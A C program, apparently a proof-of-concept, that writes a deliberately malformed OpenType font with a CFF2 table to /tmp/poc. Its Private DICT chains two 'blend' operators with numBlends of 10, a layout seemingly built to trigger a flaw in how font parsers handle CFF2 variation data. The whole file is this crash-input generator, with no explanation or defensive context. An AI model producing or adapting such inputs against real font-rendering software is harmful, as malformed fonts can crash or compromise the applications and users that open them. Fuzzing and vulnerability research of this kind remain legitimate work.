#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void w16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void w32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    /* OpenType header (sfVersion = 'OTTO') */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f);
    w16(f, 1); w16(f, 0); w16(f, 0); w16(f, 0);

    /* Table record for 'CFF2' */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f);
    w32(f, 0);
    uint32_t off_pos = ftell(f); w32(f, 0);
    uint32_t len_pos = ftell(f); w32(f, 0);

    uint32_t cff_start = ftell(f);

    /* CFF2 Header (5 bytes) + topDictLength (2 bytes) */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    fputc(0x01, f);
    fputc(0x00, f);
    uint32_t tdl_pos = ftell(f);
    w16(f, 0);

    /* Top DICT data */
    uint32_t fdarray_off_pos = ftell(f);
    fputc(0x1C, f); w16(f, 0);
    fputc(0x0C, f); fputc(0x24, f);

    uint32_t fdselect_off_pos = ftell(f);
    fputc(0x1C, f); w16(f, 0);
    fputc(0x0C, f); fputc(0x25, f);

    uint32_t vstore_off_pos = ftell(f);
    fputc(0x1C, f); w16(f, 0);
    fputc(0x18, f);

    uint32_t charstrings_off_pos = ftell(f);
    fputc(0x1C, f); w16(f, 0);
    fputc(0x11, f);

    fputc(0xFF, f);

    uint32_t topdict_end = ftell(f);
    uint32_t topdict_len = topdict_end - tdl_pos - 2;
    fseek(f, tdl_pos, SEEK_SET);
    w16(f, (uint16_t)topdict_len);
    fseek(f, 0, SEEK_END);

    /* FDArray INDEX */
    uint32_t fdarray_start = ftell(f);
    w32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    uint32_t fontdict_data_start = ftell(f);
    uint32_t priv_size_pos = ftell(f);
    fputc(0x1C, f); w16(f, 0);
    uint32_t priv_off_pos = ftell(f);
    fputc(0x1C, f); w16(f, 0);
    fputc(0x12, f);
    fputc(0xFF, f);
    uint32_t fontdict_data_len = ftell(f) - fontdict_data_start;
    fseek(f, fdarray_start + 5, SEEK_SET);
    fputc((uint8_t)(fontdict_data_len + 1), f);
    fseek(f, 0, SEEK_END);

    /* FDSelect */
    uint32_t fdselect_start = ftell(f);
    fputc(0x00, f);
    w16(f, 1);
    fputc(0x00, f);

    /* CharStrings INDEX */
    uint32_t charstrings_start = ftell(f);
    w32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x02, f);
    fputc(0x0E, f);

    /* VariationStore (format 1) */
    uint32_t vstore_start = ftell(f);
    w16(f, 1);
    uint32_t rlo_pos = ftell(f);
    w32(f, 0);
    w16(f, 1);
    uint32_t ivdo_pos = ftell(f);
    w32(f, 0);

    uint32_t regionlist_start = ftell(f);
    w16(f, 1);
    w16(f, 1);
    w16(f, 0);
    w16(f, 0x4000);
    w16(f, 0);

    uint32_t ivdata_start = ftell(f);
    w16(f, 1);
    w16(f, 0);
    w16(f, 1);
    w16(f, 0);
    fputc(0x00, f);

    uint32_t rlo_val = regionlist_start - vstore_start;
    uint32_t ivdo_val = ivdata_start - vstore_start;
    fseek(f, rlo_pos, SEEK_SET);
    w32(f, rlo_val);
    fseek(f, ivdo_pos, SEEK_SET);
    w32(f, ivdo_val);
    fseek(f, 0, SEEK_END);

    /* Private DICT */
    uint32_t private_start = ftell(f);
    /* Push 10 values for first blend */
    for (int i = 0; i < 10; i++)
        fputc(0x8C, f); /* 1 */
    /* First blend: numBlends=10, base=0, op=0x1D */
    fputc(0x95, f); /* 10 */
    fputc(0x8B, f); /* 0 */
    fputc(0x1D, f); /* blend (CFF2) */

    /* Push 10 more values for second blend */
    for (int i = 0; i < 10; i++)
        fputc(0x8C, f); /* 1 */
    /* Second blend: numBlends=10, base=10, op=0x1D */
    fputc(0x95, f); /* 10 */
    fputc(0x95, f); /* 10 */
    fputc(0x1D, f); /* blend (CFF2) */

    fputc(0xFF, f);

    uint32_t private_end = ftell(f);
    uint32_t private_size = private_end - private_start;
    uint32_t private_offset = private_start - cff_start;

    fseek(f, priv_size_pos + 1, SEEK_SET);
    w16(f, (uint16_t)private_size);
    fseek(f, priv_off_pos + 1, SEEK_SET);
    w16(f, (uint16_t)private_offset);
    fseek(f, 0, SEEK_END);

    /* Patch Top DICT offsets */
    fseek(f, fdarray_off_pos + 1, SEEK_SET);
    w16(f, (uint16_t)(fdarray_start - cff_start));
    fseek(f, fdselect_off_pos + 1, SEEK_SET);
    w16(f, (uint16_t)(fdselect_start - cff_start));
    fseek(f, vstore_off_pos + 1, SEEK_SET);
    w16(f, (uint16_t)(vstore_start - cff_start));
    fseek(f, charstrings_off_pos + 1, SEEK_SET);
    w16(f, (uint16_t)(charstrings_start - cff_start));
    fseek(f, 0, SEEK_END);

    /* Patch OpenType table record */
    uint32_t cff_end = ftell(f);
    uint32_t cff_len = cff_end - cff_start;
    fseek(f, off_pos, SEEK_SET);
    w32(f, cff_start);
    fseek(f, len_pos, SEEK_SET);
    w32(f, cff_len);

    fclose(f);
    return 0;
}